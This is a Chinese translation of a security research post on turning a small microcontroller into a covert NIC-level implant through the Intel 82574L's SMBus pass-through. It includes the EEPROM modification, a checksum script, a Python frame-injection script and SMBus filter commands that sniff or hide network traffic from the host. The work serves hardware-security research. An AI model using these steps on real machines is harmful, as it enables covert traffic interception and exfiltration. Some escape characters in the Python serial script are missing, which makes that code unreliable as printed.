## 开始

让我们首先看一下NIC和BMC之间的可能接口。主要协议之一是IPMI。

### IPMI

参考维基百科：“智能平台管理接口（IPMI）是一组计算机接口规范，用于自主计算机子系统，提供独立于主机系统的CPU，固件（BIOS或UEFI）和操作系统的管理和监视功能。”框图还显示了可能的路径如下：![1.png](https://image.3001.net/images/20181125/1543116825_5bfa1819b936e.png!small)实际上，IPMI
为NIC 定义了两个边带通道：SMBus和NC-SI。NC-SI是SMBus的现代替代品，可实现更快的传输速率和其他新功能。问题是它需要更多信号（大约10个），这在硬件植入的情况下更难以干扰。所以，我们坚持使用SMBus。

### SMBus

根据维基百科的说法，系统管理总线（SMBus）是一种单端简单的双线总线，用于轻量级通信。最常见的是在电脑主板发现与ON /
OFF指示电源的沟通。”。它源于I²C协议，它通常在许多微控制器上找到。此接口仅需要两个信号（时钟和数据），第三个信号用于异步警报。这看起来像是我们植入物的完美协议。

## 第一次接触

由于无法使用带有BMC的主板，我们必须想其他方法。在查看服务器主板数据表时，我们发现其中一些使用了Intel
82574L芯片。根据数据表，该芯片允许“SMBus高级直通接口”，这正是我们所需要的。更重要的是，它可以作为PCI-E卡使用。

## 访问SMBus

我们现在有一些带有82574L芯片的Intel
EXPI9301CTBLK卡。现在怎么办呢?回到数据表，我们可以定位和跟踪SMB_DAT、SMB_ALRT_N和整个PCB。幸运的是，它们在header中是可用的。  
![2.jpg](https://image.3001.net/images/20181125/1543116832_5bfa1820d2870.jpg!small)  
我们连接了I²C探针并扫描了SMBus，但没有任何有用的东西可以读取。读数据表显示只有在设置了特定的寄存器位时才会使能SMBus。该值从板载EEPROM加载。是时候深入挖掘了。

## 在卡片上启用SMBus访问

同样，查看数据表。SMBus访问似乎受限于从NIC
EEPROM加载的特定寄存器值。幸运的是，EEPROM可以通过flashrom读取。倾倒EEPROM内容后，我们可以对其进行分析，改变其值:

    
    
    > ./flashrom -p buspirate_spi:dev=/dev/hydrabus --read /tmp/flash.dump
    flashrom p1.0-87-g9891b75-dirty on Linux 4.18.12-arch1-1-ARCH (x86_64)
    flashrom is free software, get the source code at https://flashrom.org
    Using clock_gettime for delay loops (clk_id: 1, resolution: 1ns).
    Found Winbond flash chip "W25X40" (512 kB, SPI) on buspirate_spi.
    Reading flash... done.
    

从NVM地图看到，我们需要更改两个值：

1.Init Control Word 2 [ MNGM]；

2.兼容性[ASF SMBus已连接]；

3.兼容性[SMBus已连接]；

请注意，EEPROM中的字以小端格式存储，因此必须相应地更改值。完成后，我们仍然需要处理Checksum字。[0x00-0x40]范围内所有字的总和必须等于0xBABA。Python帮助我们计算正确的校验和：

    
    
    import struct
    data = open('/tmp/flash.mod', 'rb').read()
    tot = 0
    for i in range(0x3f):
        tot = (tot + struct.unpack('<H',data[2*i:(2*i)+2])[0]) & 0xffff
    print("Checksum word must be : " + hex(0xbaba-tot))
    #​Checksum word must be : 0x9efb
    

最后，我们对EEPROM做了如下更改：

    
    
    < 00000000: 6805 ca89 b22e 2004 46f7 8010 ffff ffff h..... .F.......
    > 00000000: 6805 ca89 b22e 3014 46f7 8010 ffff ffff h.....0.F.......
    < 00000010: 69e4 0881 6b02 1fa0 8680 d310 ffff 5a9c i...k.........Z.
    > 00000010: 69e4 0881 6b02 1fa0 8680 d310 ffff 5adc i...k.........Z.
    < 00000070: ffff ffff ffff ffff ffff 3001 ffff 0bef ..........0.....
    > 00000070: ffff ffff ffff ffff ffff 3001 ffff fb9e ..........0.....
    

一旦完成更改并闪存到EEPROM，我们连接I²C探头：

    
    
    i2c1> scan
    Device found at address 0x49
    i2c1>
    

注意，由于I²C地址是以7位编码的，我们需要使用`0x49 << 1 =
0x92`作为地址,我们现在有一个工作设置我们的植入物。我们现在可以开始向NIC发送一些命令：  
![3.jpg](https://image.3001.net/images/20181125/1543116841_5bfa182932613.jpg!small)

## 获取信息

我们继续读取数据表，并向NIC发送精心制作的命令，以验证一切正常。同样，数据表在8.4.4章中解释了我们需要了解的关于事务格式的所有内容。唯一的区别是我们不需要计算PEC(为每个包计算的SMBus校验和)。例如，我们可以使用以下顺序将命令CMD发送到地址@SLAVE:`[START]
[@SLAVE] [CMD] ( [START] [@SLAVE] [READ_DATA] )
[STOP]`[START]和[STOP]是I²C协议定义的START和STOP条件。例如，读取MAC地址的命令是0xD4。在I²C模式下发送SMBus命令如下：`[START]
[0x92] [0xD4] [START] [0x92] [read 8 bytes] [STOP]`翻译成Hydrabus命令，就是：

    
    
    i2c1> [ 0x92 0xd4 [ 0x92 hd:2 hd:6 ]
    I2C START
    WRITE: 0x92 ACK 0xD4 ACK            <== [NIC address] [command]
    I2C START                           <== Switch state 
    WRITE: 0x92 ACK                     <== [NIC address]
    07 D4 | ..                          <== Read [length] [header]
    68 05 CA 89 B2 2E | h.....          <== Read MAC address bytes
    NACK
    I2C STOP
    

## 创建植入物

现在我们知道如何与我们的NIC通信，让我们看看我们如何实际使用此通道来窃取网络流量并发送一些。同样，数据表的第8章解释了我们所需要的一切，以便做我们想要的。

### 发送数据包

我们可以使用命令简单地生成以太网帧。以下是Hydrabus或Bus Pirate发送数据包的示例脚本：

    
    
    import serial 
    import struct
    from scapy.all import *
    ser = serial.Serial('/dev/ttyACM0',115200)
    def send_frame(pkt):
        # Define the frame size
        pktlen = struct.pack("B", len(pkt))
        
        # Define the data length to be sent
        fulllen = struct.pack(">h", len(pkt)+3)
        # I2C write-then-read. Send frame + SMBus header, receive 0
        ser.write('x08'+fulllen+'x00x00')
        ser.write("x92xc4"+pktlen+pkt)
        # If packet has been sent successfully
        if ser.read(1) == 'x01':
            print "Send OK"
        else:
            print "Error sending"
            ser.write('x00')
            ser.write('x00')
            ser.write('x0Fn')
            quit()
    # Open Hydrabus in binary mode
    for i in xrange(20):
        ser.write("x00")
        if "BBIO1" not in ser.read(5):
            print "Could not get into binary mode"
            quit()
    # Switch to I2C mode
    ser.write('x02')
    if "I2C1" not in ser.read(4):
        print "Cannot set I2C mode"
        quit()
    #Create the frame to send
    p = Ether(src="11:22:33:44:55:66", dst="ff:ff:ff:ff:ff:ff") / IP(src="10.31.32.82", dst="10.31.32.80")/ICMP()
    #Send the frame
    send_frame(str(p))
    # Return to main binary mode
    ser.write('x00')
    #reset to console mode
    ser.write('x0Fn')
    

一旦脚本被执行，我们可以看到来自植入机器的数据包，但最有趣的是植入的主机根本看不到：![4.png](https://image.3001.net/images/20181125/1543116857_5bfa1839da92c.png!small)[攻击者机器左上角的tcpdump。植入的机器位于右上方。  

## 读包

### 过滤

为了知道哪些帧转到SMBus, NIC,可以使用可管理性过滤器匹配来自网络的流量。

1.我们可以通过设置与流量匹配的过滤器并将它们转发到PCIe和SMBus来嗅探流量。

2.我们可以通过将流量路由到SMBus来使流量消失。

3.我们可以创建一个植入主机看不到的隐蔽通道。最重要的是，过滤选项可以匹配各种框架元素：

（1）UDP / TCP端口

（2）VLAN3.IPv4 - IPv64.MAC地址

## 实现

要正确设置所有内容是相当困难的，我们尝试了许多不同的组合，以便过滤工作。幸运的是，Intel的应用程序说明为我们提供了更多关于如何以我们需要的方式启动过滤器的细节。我们可以设置所有使用四个命令：

    
    
    //Disable filtering globally
    [ 0x92 0xca 0x01 0x40 ]
    //Configure MDEF[0] to receive frames coming to UDP/664 and UDP/623
    [ 0x92 0xcc 0x06 0x61 0x00 0x00 0x00 0x0c 0x00 ]
    //Configure MANC2H to disallow forwarding to the OS
    [ 0x92 0xcc 0x05 0x0a 0x00 0x00 0x00 0x00 ]
    // Enable filtering (SMBus alerting, status reporting / Enable)
    [ 0x92 0xca 0x01 0x45 ]
    

receive
enable命令需要设置一些位来启用接收，以及用来将帧发送回我们的implant的方法。我们选择了SMBus警报，因为其他模式允许NIC在SMBus上执行异步请求。

## 了解框架

因为我们使用了SMBus警告方法，所以在发送Receive
TCO包命令之前，我们需要等待SMB_ALRT_N信号关闭。如果我们等待太久，数据包将从网卡中丢弃。在本例中，我们只是周期性地发送以太网帧并发送读命令，以确认该原理是有效的。

我们的设置如下：

1.植入的主机具有过滤器来匹配来自UDP端口623的流量；

2.植入物由Hydrabus模拟；

3.另一台主机正在发送与过滤器匹配的数据包，该数据包使用以下Scapy脚本：

    
    
    from scapy.all import *
    p=Ether()/IP(dst="10.31.32.81")/UDP(dport=0x26f)/"MALICIOUS PAYLOAD"
    while(1):sendp(p)
    

结果非常有趣：  
![5.png](https://image.3001.net/images/20181125/1543116867_5bfa1843ea015.png!small)在左边，我们可以看到读取框架的SMBus命令，以及包含在下面的框架中的数据。在右侧，在植入的主机上运行的tcpdump不显示任何传入帧。

## 传送帧

通过更改MANC2H寄存器，可以将流量发送到SMBus，同时PCIe允许主机正确读取帧。例如，让我们创建一个匹配UDP/161
(SNMP)流量的捕获过滤器，并将其转发给SMBus和PCIe:

    
    
    //Disable filtering globally
    [ 0x92 0xca 0x01 0x40 ]
    //Create the flex port filter 0 on port 161 (0xa1)
    ​[ 0x92 0xcc 0x04 0x63 0x00 0x00 0xa1 ]
    //Configure MDEF[0] to accept traffic matching flex filter 0
    [ 0x92 0xcc 0x06 0x61 0x00 0x00 0x00 0x10 0x00 ]
    //Configure MANC2H to allow forwarding MDEF[0] traffic to PCIe
    [ 0x92 0xcc 0x05 0x0a 0x00 0x00 0x00 0x00 ]
    // Enable filtering (SMBus alerting, status reporting / Enable)
    [ 0x92 0xca 0x01 0x45 ]
    

现在我们已经运行了过滤器，我们可以向植入的主机发送一个SNMP查询，并看到植入所捕获的包。注意，植入的主机响应查询，即数据包正确发送到SMBus和PCIe：  
![6.png](https://image.3001.net/images/20181125/1543116885_5bfa18559fbc5.png!small)

## 结论

在这篇文章中，我们描述了一种可能的方法，可以将小而廉价的微控制器用作NIC级别的植入物。这种植入需要至少四个引脚（Vcc，GND，CLK，DAT）才有用，并允许控制主机NIC。

这种植入物的功能是：

1.嗅探来自主机的网络流量；

2.在没有主机知道的情况下从网络接收命令；

3.在没有主机注意的情况下将数据传输到网络。

这个例子使用Hydrabus作为I²C/
SMBus的接口，为了简单起见，但在像ATtiny85这样的小型微控制器上实现相同的功能（几乎与NIC的EEPROM大小相同）也同样容易。然而，在实际情况下，这样的植入物只能访问SMBus。根据主板设计，这可能是唯一可访问的设备，因此无法与主机操作系统进行交互。在需要完全操作系统受损的情况下，修改BMC代码将是最佳选择，因为它已经可以访问所有有趣的总线并且不会在主板上留下任何可见的占用空间。这种植入物的另一个缺点是它只能以大约100Kb
/秒的速度获得数据，这不足以进行全面的检查。最重要的是，植入物只能捕获来自网络的流量。与将其实现到目标硬件所需的努力相比，这使得该解决方案的效率有些低。

***参考来源[kudelskisecurity](https://research.kudelskisecurity.com/2018/10/23/build-your-own-hardware-implant/)，周大涛编译，转载请注明来自FreeBuf.COM**

